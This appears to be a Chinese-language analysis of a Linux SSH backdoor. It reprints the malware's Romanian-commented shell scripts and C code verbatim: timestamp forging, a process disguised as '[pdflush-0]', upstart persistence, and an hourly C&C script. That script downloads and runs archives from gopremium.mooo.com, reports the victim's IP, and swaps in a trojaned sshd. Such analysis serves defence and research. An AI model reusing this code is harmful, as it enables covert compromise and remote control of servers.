+##&nbsp;EOF&nbsp;adaog&nbsp;timestamp&nbsp;
+echo&nbsp;&quot;$main_link&quot;&nbsp;&gt;&nbsp;/usr/lib/libu.a/l3290367235
+luam_timestamp&nbsp;/usr/lib/libu.a/l3290367235
+main_link_check=`cat&nbsp;/usr/lib/libu.a/l3290367235`
+if&nbsp;[&nbsp;&quot;$main_link&quot;&nbsp;==&nbsp;&quot;$main_link_check&quot;&nbsp;]&nbsp;;&nbsp;then
+&nbsp;#echo&nbsp;&quot;aceleasi&nbsp;linkuri&quot;
+&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;green
+&nbsp;echo&nbsp;&quot;main&nbsp;server&nbsp;link:&nbsp;$main_link_check&quot;
+&nbsp;good=1
+else
+&nbsp;#echo&nbsp;&quot;difera&quot;
+&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;red
+&nbsp;echo&nbsp;&quot;there&nbsp;is&nbsp;something&nbsp;wrong&nbsp;with&nbsp;the&nbsp;main_link.&quot;
+&nbsp;good=0
+fi
+if&nbsp;[&nbsp;&quot;$good&quot;&nbsp;!=&nbsp;&quot;1&quot;&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;&quot;Some&nbsp;files&nbsp;are&nbsp;missing&nbsp;or&nbsp;empty.&nbsp;Existing.&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+echo&nbsp;-ne&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+echo&nbsp;-n&nbsp;&quot;press&nbsp;any&nbsp;key&nbsp;if&nbsp;link&nbsp;is&nbsp;okay&quot;&nbsp;;&nbsp;read&nbsp;a
+#&nbsp;EOF&nbsp;facem&nbsp;linkul&nbsp;de&nbsp;la&nbsp;main&nbsp;server&nbsp;in&nbsp;functie&nbsp;de&nbsp;director
+###&nbsp;verificam&nbsp;daca&nbsp;e&nbsp;instalat&nbsp;ce&nbsp;folosim
+DEP=(
+&#39;/usr/bin/curl&#39;
+&#39;/bin/sed&#39;
+&#39;/usr/bin/gcc&#39;
+&#39;dep-install_install2&#39;
+&#39;dep-install_ptty&#39;
+)
+for&nbsp;t&nbsp;in&nbsp;&quot;${DEP[@]}&quot;&nbsp;;&nbsp;do
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;-f&nbsp;$t&nbsp;]&nbsp;;&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;$t&nbsp;-&nbsp;found&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-ne&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&quot;&nbsp;#&nbsp;red
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;$t&nbsp;-&nbsp;MISSING&nbsp;OR&nbsp;EMPTY&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;good=0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fi
+done
+if&nbsp;[&nbsp;&quot;$good&quot;&nbsp;!=&nbsp;&quot;1&quot;&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;&quot;Some&nbsp;files&nbsp;are&nbsp;missing&nbsp;or&nbsp;empty.&nbsp;Existing.&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+echo&nbsp;-ne&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;\033[0m\033[0m&quot;&nbsp;#cyan
+echo&nbsp;&quot;starting&nbsp;dep-install_install2&quot;
+./dep-install_install2</pre><p><br/></p><p style="background: white"><span style="font-size: 16px;"><strong><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68);">对dep-install_install2脚本的分析</span></strong></span></p><p style="text-indent: 37px;background: white"><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px;">该脚本的第一部分使用了同样的手段来修改文件的时间戳。</span></p><p style="text-indent: 37px;background: white"><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px;">然后它会查询http://gopremium.mooo.com/.unix/return_ip.php来找出受损系统的公开IP。</span></p><p style="text-indent: 37px;background: white"><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px;">此外还有一个函数来生成一个唯一的随机ID，用来定位受损系统。</span></p><p style="text-indent: 37px;background: white"><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px;">该脚本还会编译events.c，这是一个每小时运行一次的程序，作用是来启动另一个指令/usr/bin/ptty。它甚至会定义一个假名字[pdflush-0]，pdfflush 是一个通常用于为高速缓存在 Linux 系统中运行的程序。还有另一个有趣的技术来隐藏恶意进程。<br/> Events.c内容如下：</span><span style="color: rgb(68, 68, 68); font-family: 微软雅黑, sans-serif; font-size: 19px;">&nbsp;</span></p><pre class="brush:plain;toolbar:false">#include&nbsp;&lt;stdio.h&gt;
+#include&nbsp;&lt;pthread.h&gt;
+#define&nbsp;FAKE&nbsp;&quot;[pdflush-0]&quot;
+int&nbsp;main(int&nbsp;argc,&nbsp;char&nbsp;**argv){
+strcpy(argv[0],FAKE);
+while&nbsp;(1)&nbsp;{
+sleep(3600);
+system(&quot;/usr/sbin/ptty&nbsp;1&gt;&gt;/dev/null&nbsp;2&gt;&gt;/dev/null&quot;);
+}
+return&nbsp;0;
+}</pre><p style="text-indent: 29px"><span style="font-size:15px;font-family:&#39;微软雅黑&#39;,&#39;sans-serif&#39;;color:#444444;background:white"><br/> &nbsp;&nbsp;&nbsp; </span><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px; background: white;">在C语言代码中被调用的&nbsp;/usr/sbin/ptty指令是脚本&nbsp;dep-install_ptty，这是TGZ文件的一部分。我会在之后具体解释脚本内容。<br/> &nbsp;&nbsp; 此脚本所做的下一件事就是确保执行event二进制文件（编译文件）。这是通过修改/etc/init/env.conf&nbsp;文件，在其中加入对外壳脚本&nbsp;/usr/sbin/env.&nbsp;&nbsp;/usr/sbin/env的调用，该外壳程序是用来调用event二进制文件的。<br/> &nbsp;&nbsp; 下面是修改版本的内容（请注意最后一行以及对/usr/sbin/env的调用）：</span></p><pre class="brush:plain;toolbar:false">#&nbsp;env&nbsp;-&nbsp;Event&nbsp;System&nbsp;Register
+description&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Event&nbsp;System&nbsp;Register&quot;
+start&nbsp;on&nbsp;runlevel&nbsp;[2345]
+stop&nbsp;on&nbsp;runlevel&nbsp;[!2345]
+respawn
+exec&nbsp;/usr/sbin/env</pre><p><br/></p><p style="text-indent: 29px;line-height: 18px;background: white"><span style="font-size: 16px;"><strong><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68);">&quot;/usr/bin/env</span></strong><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68);">&quot;</span></span><span style="font-size: 15px;font-family: 微软雅黑, sans-serif;color: rgb(68, 68, 68)"> &nbsp;<span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px;">也是side_files.tgz的一部分，基本上调用编译好的二进制文件</span>&nbsp;<span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px;"><strong>&#39;events</strong>&#39;</span>.&nbsp;<br/> <br/><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; <span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px;">&quot;/usr/sbin/env&quot;</span></strong><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px;">中的代码</span><strong><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px;"></span>：</strong></span><span style="color: rgb(68, 68, 68); font-family: 微软雅黑, sans-serif; font-size: 15px;">&nbsp;</span></p><pre class="brush:plain;toolbar:false">killall&nbsp;-9&nbsp;events&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null
+nohup&nbsp;events&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null&nbsp;&amp;</pre><p style="text-indent: 37px;background: white"><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); font-size: 16px;">通过对不同的文件的多次调用来执行恶意文件，并利用其他的二进制文件和配置文件，使得网络罪犯得以隐身。<br/> &nbsp;&nbsp;&nbsp; 最后，脚本会发送一个 HTTP 请求到服务器，用来通知已经入侵了一个新的系统。发生这种情况会通过 URL http://gopremium.mooo.com/.unix/srv-newinstall.php</span></p><p style="text-indent:37px"><span style="font-size: 16px;"><strong><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); background: white;"><br/></span></strong></span></p><p style="text-indent:37px"><span style="font-size: 16px;"><strong><span style="font-family: 微软雅黑, sans-serif; color: rgb(68, 68, 68); background: white;">对dep-install_ptty脚本的分析</span></strong></span></p><p style="text-indent: 37px;background: white"><span style="color: rgb(68, 68, 68); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;">此脚本负责每小时与C&amp;C进行交互。脚本的主要作用如下：</span></p><p style="margin-left:0;text-indent:37px"><span style="color: rgb(68, 68, 68); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;">·&nbsp;&nbsp;检查是否还有其他用户连接到系统当中，由此来决定脚本剩余内容是否需要执行</span></p><p style="margin-left:0;text-indent:37px"><span style="color: rgb(68, 68, 68); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;">·&nbsp;&nbsp;从URL&nbsp;http://gopremium.mooo.com/.unix/srvupdt.tgz.下载更新</span></p><p style="margin-left:0;text-indent:37px"><span style="color: rgb(68, 68, 68); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;">·&nbsp;&nbsp;从URL&nbsp;http://gopremium.mooo.com/.unix/srvupdt_IDXYZ.tgz（其中 IDXYZ 是该系统的唯一 ID）下载此特定受损系统的任何更新版本</span></p><p style="margin-left:0;text-indent:37px"><span style="color: rgb(68, 68, 68); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;">·&nbsp;&nbsp;检查IP是否已经更改，它会查询http://gopremium.mooo.com/.unix/return_ip.php，将其与以前的IP进行对比</span></p><p style="margin-left:0;text-indent:37px"><span style="color: rgb(68, 68, 68); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;">·&nbsp;&nbsp;检查SSHD二进制文件中是否有任何变化，如果服务器已经遭到破坏，就会通过http://gopremium.mooo.com//.unix/srv.php?ip=XXXXip_changed=NO&amp;sshd_changed=NO&amp;sshd_backup_missing=NO&amp;srv_was_down=YES&amp;ptty_ver=3.0（XXXX是当前IP）发送该信息。</span><span style="background-color: white;"></span></p><pre class="brush:plain;toolbar:false">#!/bin/bash
+ptty_ver=&quot;3.0&quot;
+#########&nbsp;verificam&nbsp;daca&nbsp;e&nbsp;cineva&nbsp;logat&nbsp;si&nbsp;nu&nbsp;are&nbsp;idle.
+logati_fara_idle=`w|grep&nbsp;-v&nbsp;&#39;southsea\|inordkuo\|localte\|lolo&#39;|grep&nbsp;-v&nbsp;days|cut&nbsp;-c43-50|grep&nbsp;s`
+if&nbsp;[[&nbsp;-z&nbsp;$logati_fara_idle&nbsp;]]&nbsp;;&nbsp;then
+&nbsp;#&nbsp;echo&nbsp;&quot;nu&nbsp;e&nbsp;nimeni&nbsp;activ&nbsp;pe&nbsp;server&quot;
+&nbsp;useri=0
+else
+&nbsp;#&nbsp;echo&nbsp;&quot;sunt&nbsp;useri&nbsp;activi&nbsp;pe&nbsp;server&quot;
+&nbsp;useri=1
+fi
+#&nbsp;EOF&nbsp;verificam&nbsp;daca&nbsp;e&nbsp;cineva&nbsp;logat&nbsp;si&nbsp;nu&nbsp;are&nbsp;idle.
+########&nbsp;continuam&nbsp;cu&nbsp;scriptul&nbsp;DOAR&nbsp;DACA&nbsp;nu&nbsp;sunt&nbsp;useri&nbsp;activi&nbsp;pe&nbsp;server
+if&nbsp;[&nbsp;&quot;$useri&quot;&nbsp;==&nbsp;&quot;0&quot;&nbsp;]&nbsp;;&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#######&nbsp;verificam&nbsp;daca&nbsp;merge&nbsp;dns-ul,&nbsp;daca&nbsp;nu,&nbsp;adaogam&nbsp;nameserver
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dns=`cat&nbsp;/etc/resolv.conf&nbsp;|grep&nbsp;208.67.220.222`
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[[&nbsp;-z&nbsp;$dns&nbsp;]]&nbsp;;&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;echo&nbsp;&quot;dns&nbsp;nu&nbsp;e&nbsp;bun&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;nameserver&nbsp;208.67.220.222&quot;&nbsp;&gt;&gt;&nbsp;/etc/resolv.conf
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;EOF&nbsp;verificam&nbsp;daca&nbsp;merge&nbsp;dns-ul,&nbsp;daca&nbsp;nu,&nbsp;adaogam&nbsp;nameserver
+&nbsp;#######&nbsp;continuam&nbsp;cu&nbsp;scriptul&nbsp;DOAR&nbsp;DACA&nbsp;merge&nbsp;netul,&nbsp;verificam&nbsp;pe&nbsp;google
+&nbsp;url_check_net=&quot;http://google.com&quot;
+&nbsp;if&nbsp;curl&nbsp;--output&nbsp;/dev/null&nbsp;--silent&nbsp;--head&nbsp;--fail&nbsp;&quot;$url_check_net&quot;;&nbsp;then
+&nbsp;&nbsp;#&nbsp;echo&nbsp;&quot;URL&nbsp;exists:&nbsp;$url_check_net&nbsp;-&nbsp;merge&nbsp;netul&quot;
+&nbsp;&nbsp;
+&nbsp;&nbsp;ip=`cat&nbsp;/usr/lib/libu.a/i1935678123`
+&nbsp;&nbsp;id_unic=`cat&nbsp;/usr/lib/libu.a/g239293471`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;id&nbsp;unic&nbsp;pt&nbsp;fiecare&nbsp;server&nbsp;in&nbsp;parte,&nbsp;e&nbsp;generat&nbsp;la&nbsp;install
+&nbsp;&nbsp;url=`cat&nbsp;/usr/lib/libu.a/l3290367235`&nbsp;&nbsp;#&nbsp;hostul&nbsp;principal&nbsp;il&nbsp;ia&nbsp;din&nbsp;txt
+&nbsp;&nbsp;#url=&quot;http://192.168.137.177/test/sc/test&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;hostul&nbsp;principal.&nbsp;E&nbsp;DEFINIT&nbsp;IN&nbsp;ptty&nbsp;SI&nbsp;IN&nbsp;install
+&nbsp;
+&nbsp;&nbsp;###&nbsp;adaog&nbsp;timestamp
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;luam_timestamp()&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;touch&nbsp;-r&nbsp;/usr/lib/libu.a/TS8402386704&nbsp;$1&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;#&nbsp;EOF&nbsp;timestamp
+&nbsp;&nbsp;luam_timestamp&nbsp;/usr/lib/libu.a
+&nbsp;&nbsp;luam_timestamp&nbsp;/usr/lib/libu.a/l3290367235
+&nbsp;&nbsp;luam_timestamp&nbsp;/usr/lib/libu.a/i1935678123
+&nbsp;&nbsp;luam_timestamp&nbsp;/usr/lib/libu.a/g239293471
+&nbsp;&nbsp;#########&nbsp;DACA&nbsp;EXISTA&nbsp;ARHIVA&nbsp;srvupdt.tgz&nbsp;PE&nbsp;SERVERUL&nbsp;DE&nbsp;BAZA,&nbsp;O&nbsp;DOWNLOADEAZA,&nbsp;EXTRAGE&nbsp;SI&nbsp;EXECUTA.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url_srvupdt=&quot;$url/srvupdt.tgz&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;il&nbsp;pui&nbsp;daca&nbsp;vrei&nbsp;sa&nbsp;lansezi&nbsp;un&nbsp;script&nbsp;pe&nbsp;servere
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url_srvupdt_confirmare=&quot;$url/srvupdt.php?ip=$ip&amp;tgz=srvupdt.tgz&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;intra&nbsp;pe&nbsp;el&nbsp;ca&nbsp;sa&nbsp;confirme&nbsp;ca&nbsp;a&nbsp;tras&nbsp;arhiva
+&nbsp;&nbsp;if&nbsp;curl&nbsp;--output&nbsp;/dev/null&nbsp;--silent&nbsp;--head&nbsp;--fail&nbsp;&quot;$url_srvupdt&quot;;&nbsp;then
+&nbsp;&nbsp;&nbsp;#&nbsp;echo&nbsp;&quot;URL&nbsp;exists:&nbsp;$url_srvupdt&quot;
+&nbsp;&nbsp;&nbsp;curl&nbsp;-s&nbsp;&quot;${url_srvupdt_confirmare}&quot;&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null&nbsp;&amp;
+&nbsp;&nbsp;&nbsp;tempdir=&quot;/tmp/.tmp&quot;
+&nbsp;&nbsp;&nbsp;rm&nbsp;-rf&nbsp;&quot;$tempdir&quot;&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;&nbsp;mkdir&nbsp;&quot;$tempdir&quot;&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;&nbsp;curl&nbsp;--silent&nbsp;&nbsp;&quot;$url_srvupdt&quot;&nbsp;--output&nbsp;&quot;$tempdir&quot;/srvupdt.tgz&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;&nbsp;cd&nbsp;&quot;$tempdir&quot;&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;&nbsp;tar&nbsp;zxvf&nbsp;srvupdt.tgz&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;&nbsp;cd&nbsp;srvupdt&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;&nbsp;./install&nbsp;&amp;&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;fi
+&nbsp;&nbsp;#&nbsp;EOF&nbsp;DACA&nbsp;EXISTA&nbsp;ARHIVA&nbsp;PE&nbsp;SERVERUL&nbsp;DE&nbsp;BAZA,&nbsp;O&nbsp;DOWNLOADEAZA,&nbsp;EXTRAGE&nbsp;SI&nbsp;EXECUTA
+&nbsp;&nbsp;#########&nbsp;ARHIVA&nbsp;SPECIAL&nbsp;FACUTA&nbsp;PT&nbsp;FIECARE&nbsp;SERVER&nbsp;IN&nbsp;PARTE.&nbsp;foloseste&nbsp;$id_unic
+&nbsp;&nbsp;url_id_unic=&quot;$url/srvupdt_$id_unic.tgz&quot;
+&nbsp;&nbsp;url_id_unic_confirmare=&quot;$url/srvupdt.php?ip=$ip&amp;tgz=srvupdt_$id_unic.tgz&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;intra&nbsp;pe&nbsp;el&nbsp;ca&nbsp;sa&nbsp;confirme&nbsp;ca&nbsp;a&nbsp;tras&nbsp;arhiva
+&nbsp;&nbsp;if&nbsp;curl&nbsp;--output&nbsp;/dev/null&nbsp;--silent&nbsp;--head&nbsp;--fail&nbsp;&quot;$url_id_unic&quot;;&nbsp;then&nbsp;
+&nbsp;&nbsp;&nbsp;#&nbsp;echo&nbsp;&quot;URL&nbsp;exists:&nbsp;$url_id_unic&quot;
+&nbsp;&nbsp;&nbsp;curl&nbsp;-s&nbsp;&quot;${url_id_unic_confirmare}&quot;&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null&nbsp;&amp;
+&nbsp;&nbsp;&nbsp;tempdir=&quot;/var/tmp/.tmp&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rm&nbsp;-rf&nbsp;&quot;$tempdir&quot;&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mkdir&nbsp;&quot;$tempdir&quot;&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;&nbsp;curl&nbsp;--silent&nbsp;&nbsp;&quot;$url_id_unic&quot;&nbsp;--output&nbsp;&quot;$tempdir&quot;/srvupdt_$id_unic.tgz&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;&nbsp;cd&nbsp;&quot;$tempdir&quot;&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;&nbsp;tar&nbsp;zxvf&nbsp;srvupdt_$id_unic.tgz&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;&nbsp;cd&nbsp;srvupdt_$id_unic&nbsp;1&gt;/dev/null&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;&nbsp;./install&nbsp;&amp;&nbsp;2&gt;/dev/null
+&nbsp;&nbsp;fi
+&nbsp;&nbsp;#&nbsp;EOF&nbsp;RHIVA&nbsp;SPECIAL&nbsp;FACUTA&nbsp;PT&nbsp;FIECARE&nbsp;SERVER&nbsp;IN&nbsp;PARTE.&nbsp;foloseste&nbsp;$id_unic
+&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;##########&nbsp;PORNIM&nbsp;RESTUL&nbsp;SCRIPTULUI
+&nbsp;&nbsp;changes=0
+&nbsp;&nbsp;ip_changed=&quot;NO&quot;
+&nbsp;&nbsp;sshd_changed=&quot;NO&quot;
+&nbsp;&nbsp;sshd_backup_missing=&quot;NO&quot;
+&nbsp;&nbsp;srv_was_down=&quot;NO&quot;
+&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;########&nbsp;verificam&nbsp;ce&nbsp;ip&nbsp;are&nbsp;serverul
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url_return_ip=&quot;$url/return_ip.php&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;din&nbsp;el&nbsp;ia&nbsp;valoarea&nbsp;$new_ip&nbsp;fiecare&nbsp;server
+&nbsp;&nbsp;&nbsp;if&nbsp;curl&nbsp;--output&nbsp;/dev/null&nbsp;--silent&nbsp;--head&nbsp;--fail&nbsp;&quot;$url_return_ip&quot;;&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;new_ip=`curl&nbsp;-s&nbsp;&quot;$url_return_ip&quot;|grep&nbsp;-Eo&nbsp;&#39;([0-9]{1,3}\.){3}[0-9]{1,3}&#39;`
+&nbsp;&nbsp;&nbsp;fi
+&nbsp;&nbsp;&nbsp;#&nbsp;EOF&nbsp;verificam&nbsp;ce&nbsp;ip&nbsp;are&nbsp;serverul
+&nbsp;&nbsp;&nbsp;#######&nbsp;verificam&nbsp;daca&nbsp;s-a&nbsp;schimbat&nbsp;ip-ul
+&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;&quot;$ip&quot;&nbsp;!=&nbsp;&quot;$new_ip&quot;&nbsp;]&nbsp;;&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;s-a&nbsp;schimbat&nbsp;ip-ul
+&nbsp;&nbsp;&nbsp;&nbsp;changes=1
+&nbsp;&nbsp;&nbsp;&nbsp;ip_changed=&quot;$new_ip&quot;
+&nbsp;&nbsp;&nbsp;fi
+&nbsp;&nbsp;&nbsp;#&nbsp;EOF&nbsp;verificam&nbsp;daca&nbsp;s-a&nbsp;schimbat&nbsp;ip-ul
+&nbsp;&nbsp;&nbsp;#######&nbsp;verificam&nbsp;daca&nbsp;mai&nbsp;exista&nbsp;backup-ul&nbsp;la&nbsp;sshd-ul&nbsp;nostru&nbsp;si&nbsp;il&nbsp;comparam&nbsp;cu&nbsp;/usr/sbin/sshd
+&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;-f&nbsp;/usr/lib/libu.a/m9847292&nbsp;]&nbsp;;&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;exista&nbsp;fisierul&nbsp;nostru&nbsp;de&nbsp;rk
+&nbsp;&nbsp;&nbsp;&nbsp;size_rk=`wc&nbsp;-c&nbsp;&lt;&nbsp;/usr/lib/libu.a/m9847292`
+&nbsp;&nbsp;&nbsp;&nbsp;size_sshd=`wc&nbsp;-c&nbsp;&lt;&nbsp;/usr/sbin/sshd`
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;&quot;$size_rk&quot;&nbsp;!=&nbsp;&quot;$size_sshd&quot;&nbsp;]&nbsp;;&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;cineva&nbsp;a&nbsp;schimbat&nbsp;sshd-ul
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;###&nbsp;punem&nbsp;sshd-ul&nbsp;meu&nbsp;inapoi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cp&nbsp;/usr/lib/libu.a/m9847292&nbsp;/usr/lib/libu.a/sshd&nbsp;1&gt;&gt;/dev/null&nbsp;2&gt;&gt;/dev/null
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chattr&nbsp;-aui&nbsp;/usr/sbin/sshd&nbsp;1&gt;&gt;/dev/null&nbsp;2&gt;&gt;/dev/null
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mv&nbsp;-f&nbsp;/usr/lib/libu.a/sshd&nbsp;/usr/sbin/sshd&nbsp;1&gt;&gt;/dev/null&nbsp;2&gt;&gt;/dev/null
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rm&nbsp;-rf&nbsp;/usr/lib/libu.a/sshd&nbsp;1&gt;&gt;/dev/null&nbsp;2&gt;&gt;/dev/null
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killall&nbsp;-9&nbsp;sshd&nbsp;1&gt;&gt;/dev/null&nbsp;2&gt;&gt;/dev/null
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;luam_timestamp&nbsp;/usr/sbin/sshd
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/usr/sbin/sshd&nbsp;1&gt;&gt;/dev/null&nbsp;2&gt;&gt;/dev/null
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;EOF&nbsp;punem&nbsp;sshd-ul&nbsp;meu&nbsp;inapoi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;changes=1
